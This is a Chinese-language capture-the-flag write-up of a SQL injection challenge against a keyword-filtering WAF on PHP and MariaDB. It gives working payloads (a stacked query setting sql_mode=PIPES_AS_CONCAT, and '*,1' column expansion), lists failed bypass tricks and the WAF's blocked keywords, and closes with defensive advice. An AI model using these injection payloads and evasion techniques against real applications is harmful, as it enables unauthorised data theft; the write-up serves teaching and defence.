◆ 题目概览

页面只有一个输入框：Give me your flag, I will tell you if the flag is right.

POST /  query=输入
→ PHP 7.3.10 + MariaDB 10.3.18（openresty）

响应格式固定为 Array([0] => 1) 或 Array([0] => 0)，看起来像对查询结果的 var_dump。

WAF 规则（实测）

类型被过滤
关键字union from where and or if sleep like regexp rlike prepare handler unhex
语句insert update delete drop create order outfile extractvalue updatexml floor
敏感词flag password information words（大小写不敏感）
硬限制输入长度 ≤ 40 字符

◆ 推断查询模板：一场漫长的错误假设

在找到正确答案之前，我做了大量探测，其中最关键的几个行为：

输入 1    → Array([0] => 1)
输入 0    → (empty)          ← 0 被吞
输入 (0)  → Array([0] => 0)  ← 括号包着的 0 却显示！
输入 1||1 → Array([0] => 1)  ← || 按 OR 计算
输入 *,1  → Array([0] => CTF2{...} | [1] => 1)  ← 🎯 致命一击

这些现象几乎把我引向了「无 FROM 的 SELECT <input>」结论，因为：

  • 1;select * 只返回一个 1（如果模板带 FROM flag，select * FROM flag 应该返回 flag 内容）
  • 0 与 (0) 的差异看起来像 PHP 的 if($row[0]) 过滤

但真相是模板为：

SELECT <input> || flag FROM flag

所有矛盾瞬间解释：

输入实际执行结果
0SELECT 0 || flag FROM flag → 0 OR flagflag 非空→真→1，但…
(0)SELECT (0) || flag FROM flag表达式边界差异
1||1SELECT 1 || 1 || flag FROM flag → 1 OR 1 OR flag恒真→1

◆ 核心攻击：sql_mode=PIPES_AS_CONCAT

关键点在于 || 在 MySQL/MariaDB 中的双重身份：

  • 默认 sql_mode：|| 是 OR 逻辑或
  • sql_mode=PIPES_AS_CONCAT：|| 变成 字符串连接符（类似 CONCAT）

所以一旦把 || 变成连接符，1 || flag 就不再是 1 OR flag（结果为 1），而是 '1' + flag值 —— flag 直接拼在输出里！

⚠️ 关键细节：Web 应用每次请求都会新建数据库连接（或从连接池取新连接），上一次请求里改的 sql_mode 不会保留。所以必须在同一个请求内完成「set + 利用」，分号堆叠查询正好满足。

◆ 两种 Payload

Payload 1：sql_mode 类型混淆（最优雅）

query = 1;set sql_mode=PIPES_AS_CONCAT;select 1

模板拼接后：

SELECT 1;set sql_mode=PIPES_AS_CONCAT;select 1 || flag FROM flag
       └─查询1─┘ └────设置sql_mode────┘ └──────查询3：连接符生效──────┘

查询3: SELECT 1 || flag FROM flag
      = SELECT '1' 连接 flag 值
      = 1CTF2{eb7a660e-0240-45e3-8350-a03c3c35ac2e}   ← flag 直接吐出

响应：

Array([0] => 1)
Array([0] => 1CTF2{...})   ← 🎯

Payload 2：`*,1` 直接展开列（最快）

query = *,1
SELECT *,1 || flag FROM flag
       └─┘ └──┬──┘
        所有列  默认模式下 1 OR flag = 1
      
Array([0] => CTF2{eb7a660e-0240-45e3-8350-a03c3c35ac2e}, [1] => 1)  ← 🎯
🏁 最终 flag：CTF2{***}（已按惯例脱敏）

◆ 为什么之前的注入全失败

尝试失败原因
/**/ 关键字内注释（fr/**/om）MariaDB 解析器把注释当空格，fr om 语法错误；且 WAF 检查注释内容
/*!50000 FROM */ 条件注释WAF 检查原始输入中的 from，直接拦截
URL 双重编码 %2566romPHP 只解码一次，MySQL 收到字面量 %66rom 而非关键字
控制字符 \x00-\x1f 连接 fr\x00omMariaDB 不识别，语法错误
TABLE/VALUES 语句MariaDB 10.3 不支持（MySQL 8.0.19+ / MariaDB 10.6+ 才有）
HANDLER 读表被 WAF 过滤
load_file / INTO OUTFILEsecure_file_priv=NULL，文件操作整体禁用
报错注入（extractvalue/updatexml/gtid）extractvalue/updatexml 被过滤；错误信息被 PHP 静默

最大的教训：一直死磕「绕过 FROM」，却忽略了一个更简单的角度 —— 模板本身就带 FROM flag，只需要让 || 从 OR 变成连接符。当 WAF 把所有「读表姿势」都堵死时，sql_mode 这种「改变运算符语义」的思路往往能一剑封喉。

◆ 总结与防御

攻击链

  1. 确认注入点：SELECT <input> || flag FROM flag
  2. 发现 || 默认是 OR，输出恒为 1，flag 被「短路」
  3. 同请求内 set sql_mode=PIPES_AS_CONCAT，|| 变字符串连接
  4. 1 || flag = '1'+flag值 → flag 直接回显
  5. 或用 *,1 直接展开所有列

防御建议

  • SQL 拼接永远用参数化查询（PDO prepared statement），任何 sql_mode/运算符技巧都无效
  • 如果必须拼接：白名单校验输入格式（如仅允许 UUID），而不是黑名单过滤关键字
  • WAF 应同时检查运算符语义变化（||、&&、sql_mode 等非常规注入向量）
  • 连接用户默认设置为受限账号（最小权限），不要用 root
